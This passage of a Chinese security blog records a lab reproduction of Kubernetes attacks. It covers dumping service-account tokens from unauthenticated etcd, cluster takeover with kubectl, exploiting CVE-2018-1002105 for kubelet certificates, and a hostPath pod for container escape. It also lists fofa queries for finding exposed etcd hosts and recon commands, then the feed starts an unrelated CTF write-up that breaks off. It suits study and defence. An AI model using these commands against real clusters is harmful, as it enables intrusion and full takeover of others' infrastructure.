–token=”eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLW50cGcyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5Y2I0MGU3OC05NDllLTRhZTUtYWQ2OC1mNWU4MjVjNjg1YTAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.cJhYptSRTfI2SPTJBEMGvgmQQHTapQuUu7jJZbAlMzOiSJtaotjLZaQJo8DpoEbg0iTI_2CyC_vPqY0nj6dQyMdu5gV7nXJTJ-H5Po30-vP13bCSDesILPjP-gDMJfbrsB4RwYq_ngTnytm0MBC4k2ZBx2BH6mCXpQaGq_eU0ItmbZhKUmHSocp8AqaLsA_GAdtjhcl6whWvva1zQfWeHJ1tNrqrsmNVAXAeHQnBpJV72FFOtwi6oXryA0a4yV4QuMdYdhhEpS1fObN0_bTB7XasRB0CF9fWuKEgE4FPaUHeq2KV3CHf2Y9JhF3pI3SmQlBZ7G2kGLLB3UYViFa-Pw” -n kube-system get pods</p><p>eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLW50cGcyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5Y2I0MGU3OC05NDllLTRhZTUtYWQ2OC1mNWU4MjVjNjg1YTAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.cJhYptSRTfI2SPTJBEMGvgmQQHTapQuUu7jJZbAlMzOiSJtaotjLZaQJo8DpoEbg0iTI_2CyC_vPqY0nj6dQyMdu5gV7nXJTJ-H5Po30-vP13bCSDesILPjP-gDMJfbrsB4RwYq_ngTnytm0MBC4k2ZBx2BH6mCXpQaGq_eU0ItmbZhKUmHSocp8AqaLsA_GAdtjhcl6whWvva1zQfWeHJ1tNrqrsmNVAXAeHQnBpJV72FFOtwi6oXryA0a4yV4QuMdYdhhEpS1fObN0_bTB7XasRB0CF9fWuKEgE4FPaUHeq2KV3CHf2Y9JhF3pI3SmQlBZ7G2kGLLB3UYViFa-Pw</p><p>这里经过测试，发现clusterrole-aggregation-controller-token-c2vnw的权限是很小的，如果远程打，是获取不到pods的，403。</p><p><img src="/images/k8s/image-20240104162713928.png" alt="image-20240104162713928"></p><p>当然，如果机器安装了dashboard，也可以获取面板的token<br><img src="/images/k8s/image-20240104163233783.png" alt="image-20240104163233783"></p><p><img src="/images/k8s/image-20240104163304042.png" alt="image-20240104163304042"></p><p>面板的token也是不可以的。</p><p><img src="/images/k8s/image-20240104163501532.png" alt="image-20240104163501532"></p><p><code>经过分析其他大师傅的文章，这里不放放个其他大师傅的图了，仔细查看会发现他们打的时候，都是打的本机，也就是127.0.0.1,或者本机的内网地址,这是能够打通的.emmmmm，如果是内网，这样的话就不用那么麻烦了，如下图</code></p><p><img src="/images/k8s/image-20240104164034626.png" alt="image-20240104164034626"></p><p>这里的话，还可以看看其他pods，这里经过测验，直接匹配admin即可</p><p><img src="/images/k8s/image-20240104165552558.png" alt="image-20240104165552558"></p><p>找这种带secert的，大概率就是有权限的，再去请求，就可以</p><p><img src="/images/k8s/image-20240104165844883.png" alt="image-20240104165844883"></p><p><img src="/images/k8s/image-20240104165820101.png" alt="image-20240104165820101"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取某个pods信息</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep dashboard</span><br><span class="line"><span class="comment">#获取某个podsadmin信息</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep admin</span><br><span class="line"><span class="comment">#获取token</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  /registry/secrets/kubernetes-dashboard/admin-user-token-h9sqp</span><br><span class="line"><span class="comment">#接管集群</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443/ --token=<span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWg5c3FwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkODliYzBmNi01YzlmLTQ1YWItYTAyYi1hZGIyZjJhZGE5MjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.YU547FavovN-pugK8Oe4tJ9bLpmv8VKIMBumqHEnqaB8Y4cJkQrvkYcgPaRFMDFizK75i8wTSTMxU4U2lQ4Jhl_GY_5jQ-zYvt5z8IY3azGiiOOD-Q38HpYZjPuzJWnopp6ROuSvJGT-ynPopl9xhKCcuZjAfuzYkx8wBu856-6wWUbnndF_GVtz9QrjUHysNHIDa2ECA4cCFVmZtjFlY9108lS6GIuIlhDs7089o-3odDL5tVEdd8yMilHW7Vrb5QxWpEUDRd99meKPohtv4LhzJdJTZ3SD9PRRZFGkIU-PGjyrwgub9uaI4R7vXlSwVqV_PpnfGZnPUSom4I4UDg&quot;</span> -n kube-system get pods</span><br><span class="line"></span><br><span class="line"><span class="comment">#某个pods执行命令</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443/ --token=<span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWg5c3FwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkODliYzBmNi01YzlmLTQ1YWItYTAyYi1hZGIyZjJhZGE5MjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.YU547FavovN-pugK8Oe4tJ9bLpmv8VKIMBumqHEnqaB8Y4cJkQrvkYcgPaRFMDFizK75i8wTSTMxU4U2lQ4Jhl_GY_5jQ-zYvt5z8IY3azGiiOOD-Q38HpYZjPuzJWnopp6ROuSvJGT-ynPopl9xhKCcuZjAfuzYkx8wBu856-6wWUbnndF_GVtz9QrjUHysNHIDa2ECA4cCFVmZtjFlY9108lS6GIuIlhDs7089o-3odDL5tVEdd8yMilHW7Vrb5QxWpEUDRd99meKPohtv4LhzJdJTZ3SD9PRRZFGkIU-PGjyrwgub9uaI4R7vXlSwVqV_PpnfGZnPUSom4I4UDg&quot;</span> <span class="built_in">exec</span> -n metarget -it thinkphp-5-0-23-rce-web-7bb696c45b-x5z9k  sh</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240104171320120.png" alt="image-20240104171320120"></p><h6 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h6><p>先记个fofa语法吧，就不实战利用了，没有授权，害怕。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fofa语法: Etcd &amp;&amp; port=&quot;2379&quot;</span><br><span class="line">fofa语法: Etcd &amp;&amp; port=&quot;2379&quot; &amp;&amp; country=&quot;CN&quot; //搜中国这边etcd协议并且是2379端口的ip/域名</span><br></pre></td></tr></table></figure><p>总的来说，etcd的未授权漏洞感觉在实战中碰到会很少，为什么这样说呢，因为这个漏洞存在是因为改了面板的一个配置，而这个配置，可能很少管理员会改，因为没有发现有啥动机能改这个配置。</p><h5 id="历史apiserver提权漏洞-CVE-2018-1002105"><a href="#历史apiserver提权漏洞-CVE-2018-1002105" class="headerlink" title="历史apiserver提权漏洞(CVE-2018-1002105)"></a>历史apiserver提权漏洞(<code>CVE-2018-1002105</code>)</h5><p>CVE-2018-1002105是一个K8s提权漏洞，Kubernetes用户可以在已建立的API Server连接上，打通了client到kubelet的通道，实现提升k8s普通用户到k8s api server的权限。</p><h6 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本:"></a>漏洞影响版本:</h6><ul><li>Kubernetes v1.0.x-1.9.x</li><li>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)</li><li>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)</li><li>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</li></ul><p><img src="/images/k8s/image-20240105101906393.png" alt="image-20240105101906393"></p><h6 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件:"></a>漏洞利用条件:</h6><p>参考<code>https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/#3-k8s-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E---cve-2018-1002105</code></p><p>k8s正常请求执行的链路是 <code>client --&gt; apiserver --&gt; kubelet</code></p><p>即 client 首先对 apiserver 发起请求，例如发送请求 [连接某一个容器并执行 exec] ，请求首先会被发到 apiserver，apiserver 收到请求后首先对该请求进行认证校验，如果此时使用的是匿名用户，api server 上是可以通过认证的，但会授权失败，即 client 只能走到 apiserver 而到不了 kubelet 就被返回 403 并断开连接了。</p><p>所以本次攻击的先决条件是，需要有一个可以从 client 到 apiserver 到 kubelet 整个链路通信认证通过的用户。且要知道token，也就是那个csv里的文件password。<br>有些文章写的是获取到一个主机的root权限，然后笔者就以为如果拿到一个shell是root权限即可，其实不是。准确的来说是有一个低权限的pod命令执行的权限，还有token密码。这个密码的作用是鉴权准备好的pods的，但是不饿能访问其他pods,来实现越权。</p><h6 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h6><p><a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># cve_2018_1002105_pod.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: ubuntu</span><br><span class="line">    image: nginx:1.14.2</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    # Just spin &amp; wait forever</span><br><span class="line">    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]</span><br><span class="line">    args: [ &quot;while true; do sleep 30; done;&quot; ]</span><br><span class="line">  serviceAccount: default</span><br><span class="line">  serviceAccountName: default</span><br><span class="line"> </span><br><span class="line"># cve_2018_1002105_namespace.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Namespace</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line"> </span><br><span class="line"># cve_2018_1002105_role.yaml</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: Role</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">rules:</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">  - list</span><br><span class="line">  - delete</span><br><span class="line">  - watch</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods/exec</span><br><span class="line">  verbs:</span><br><span class="line">  - create</span><br><span class="line">  - get</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># cve_2018_1002105_role_binding.yaml</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: RoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Role</span><br><span class="line">  name: test</span><br><span class="line">subjects:</span><br><span class="line">- apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Group</span><br><span class="line">  name: test</span><br><span class="line">  </span><br><span class="line">kubectl apply -f cve_2018_1002105_namespace.yaml</span><br><span class="line">kubectl apply -f cve_2018_1002105_role.yaml </span><br><span class="line">kubectl apply -f cve_2018_1002105_rolebinding.yaml</span><br><span class="line">kubectl apply -f cve_2018_1002105_pod.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240105105544003.png" alt="image-20240105105544003"></p><p>这里都配置完成之后，也可以安装完成，但是测试请求的时候，报这个没有找到ubuntu容器，不知道为啥<br><img src="/images/k8s/image-20240105145031836.png" alt="image-20240105145031836"></p><p>看了一下，好像真的没有。</p><p><img src="/images/k8s/image-20240105145248308.png" alt="image-20240105145248308"></p><p><code>这里要注意，笔者在这里搭建环境的时候，发现，这个pod文件如果image写  image: ubuntu:latest，是起不来环境的，把image换成上面的image: nginx:1.14.2，这样就可以起来了</code></p><p><img src="/images/k8s/image-20240105154754259.png" alt="image-20240105154754259"></p><p>简单记录一下思路吧。就是获取到一个pod权限后，使用<code>https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</code>j脚本打，填写一些信息，</p><p>这里在使用exploit.py的时候，没有一个叫http_parser的库</p><p>aceback (most recent call last):<br>  File “/tools/others/exp.py”, line 15, in <module><br>    from http_parser.parser import HttpParser<br>ModuleNotFoundError: No module named ‘http_parser’</p><p>During handling of the above exception, another exception occurred:</p><p>Traceback (most recent call last):<br>  File “/tools/others/exp.py”, line 17, in <module><br>    from http_parser.pyparser import HttpParser<br>ModuleNotFoundError: No module named ‘http_parser’</p><p>在kali上面装半天没有装上，索性直接去我的ecs上装了一下，ecs ubuntu20<br><img src="/images/k8s/image-20240105153827456.png" alt="image-20240105153827456"></p><p><code>https://github.com/benoitc/http-parser/</code>项目地址，安装完成后，就可以用了，</p><p><code>python3 exploit.py --target 172.16.214.18 --port 6443 --bearer-token password --namespace test --pod test</code><br>就可以获取到三个证书文件，<br>有了这三个证书文件，直接就可以直接创建pods，<br>创建pods的</p><p><img src="/images/k8s/image-20240105155009473.png" alt="image-20240105155009473"></p><p>并且脚本已经把命令给好了，直接打即可，<br><code>kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key get pods -n kube-system</code></p><p><img src="/images/k8s/image-20240105160748881.png" alt="image-20240105160748881"></p><p>拿到三个文件，就相当于，接管了整个集群了，接着上面的任意podsrce即可。</p><h6 id="k8s逃逸"><a href="#k8s逃逸" class="headerlink" title="k8s逃逸"></a>k8s逃逸</h6><p>有了apiserver的权限就可以逃逸了，主要思路就是，有了apiserver权限，就可以创建pods，在创建的时候，直接把宿主主机的根目录映射出来。下面是创建pods的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#推荐把那个镜像换掉，这里不太清楚为什么拉去不到啊</span><br><span class="line"># attacker.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: attacker</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: ubuntu</span><br><span class="line">#    image: ubuntu:latest</span><br><span class="line">image: nginx:1.14.2</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    # Just spin &amp; wait forever</span><br><span class="line">    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]</span><br><span class="line">    args: [ &quot;while true; do sleep 30; done;&quot; ]</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: escape-host</span><br><span class="line">      mountPath: /host-escape-door</span><br><span class="line">  volumes:</span><br><span class="line">    - name: escape-host</span><br><span class="line">      hostPath:</span><br><span class="line">        path: /</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240105161604796.png" alt="image-20240105161604796"></p><p>打的时候一定要把路径对齐。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker id</span><br><span class="line"></span><br><span class="line">kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker sh</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240105162100408.png" alt="image-20240105162100408"></p><p><code>kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker id</code></p><p><img src="/images/k8s/image-20240105163047960.png" alt="image-20240105163047960"></p><p>靶机上看一眼</p><p><img src="/images/k8s/image-20240105163129394.png" alt="image-20240105163129394"></p><p>参考<code>https://teamssix.com/220324-161756.html#toc-heading-1</code><br>因为这里还是还是</p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这里其实可思考，在实战中可能出现这种情况的概率非常小，在k8s1.11版本发行的时间为2018年，那么也就是说，在这之后的都不可以了，2018年距今已经6年了，还有一个条件就是，要提前获取到一个pods的低执行权限，从才能下载到三个证书文件。</p><h5 id="实战中的一些命令"><a href="#实战中的一些命令" class="headerlink" title="实战中的一些命令"></a>实战中的一些命令</h5><p>总体看k8s的一些cve的漏洞，除了那几个未授权，利用条件似乎都比较苛刻。<br>在实战中，基本上是先拿到一个pods的shell，然后在进行一系列的操作比较多。</p><p>当我们获取了一个容器的 shell，首先执行 cat /proc/1/cgroup 是重要的。</p><p><img src="D:\myBlog\source_posts\k8s学习及漏洞复现\image-20240110111406947.png" alt="image-20240110111406947"></p><p>出现这个kubepods，就是使用k8s进行编排的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">env | grep KUBE</span><br><span class="line">ls -l /run/secrets/kubernetes.io/</span><br><span class="line">df -h</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/mtab</span><br><span class="line">cat /proc/self/status</span><br><span class="line">cat /proc/self/mounts</span><br><span class="line">cat /proc/net/unix</span><br><span class="line">cat /proc/1/mountinfo</span><br></pre></td></tr></table></figure><p><img src="D:\myBlog\source_posts\k8s学习及漏洞复现\image-20240110112309832.png" alt="image-20240110112309832"></p><p><code>查看当前环境是否为容器 cat /proc/1/cgroup看回显结果中是否有docker（这个方法一般要比ls /.dockerenv要准确，实测有些容器根目录下确实没有.dockerenv）</code></p><h6 id="特权模式判断"><a href="#特权模式判断" class="headerlink" title="特权模式判断"></a>特权模式判断</h6><p>特权模式逃逸是一种最简单有效的逃逸方法，攻击者可以通过挂载宿主机目录到容器某个目录下，直接通过命令、写ssh公钥和crontab等getshell。</p><p>创建容器时通过添加–privileged=true参数，将容器以特权模式起动</p><p>特权模式起的容器，实战可通过cat /proc/self/status |grep Cap命令判断当前容器是否通过特权模式起（0000001fffffffff代表为特权模式起）</p><p>不是</p><p><img src="D:\myBlog\source_posts\k8s学习及漏洞复现\image-20240111172526199.png" alt="image-20240111172526199"></p><p>简单的判断，也可以使用磁盘挂载命令判断。<br>df -l ，mount</p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">K8s etcd未授权访问    https://www.wangan.com/p/11v748294758597c</span><br><span class="line">浅谈 Kubernetes 安全风险 Part.1 http://wjlshare.com/archives/1744</span><br><span class="line">【云安全】k8s 提权漏洞 CVE-2018-1002105 学习 https://teamssix.com/220324-161756.html#toc-heading-5</span><br><span class="line">https://woj.app/7776.html</span><br><span class="line">https://zone.huoxian.cn/d/1153-k8s</span><br><span class="line">https://mp.weixin.qq.com/s/NwyY0MYZRSywsUe-rGytjg</span><br><span class="line">https://www.cnblogs.com/haidragon/p/16843374.html</span><br><span class="line">华为云CTF cloud非预期解之k8s渗透实战   https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/</span><br><span class="line">https://blog.csdn.net/w1590191166/article/details/122028001</span><br><span class="line">kubernetes 查看所有namespace、默认的namespace https://blog.csdn.net/u013288190/article/details/109674360</span><br><span class="line">https://xz.aliyun.com/t/12921#toc-2</span><br><span class="line">k8s之apiserver组件风险 https://zone.huoxian.cn/u/48984</span><br><span class="line">https://tttang.com/archive/1389/#toc_api-server</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>polarctfweb刷题记录</title>
      <link href="/2023/12/08/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/12/08/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="0和255"><a href="#0和255" class="headerlink" title="0和255"></a>0和255</h5><p>给到一个py文件，是图片生成坐标点的，也给了坐标点，<br>找chatgpt问一下还原一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入坐标点列表</span></span><br><span class="line">image_list = [[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span 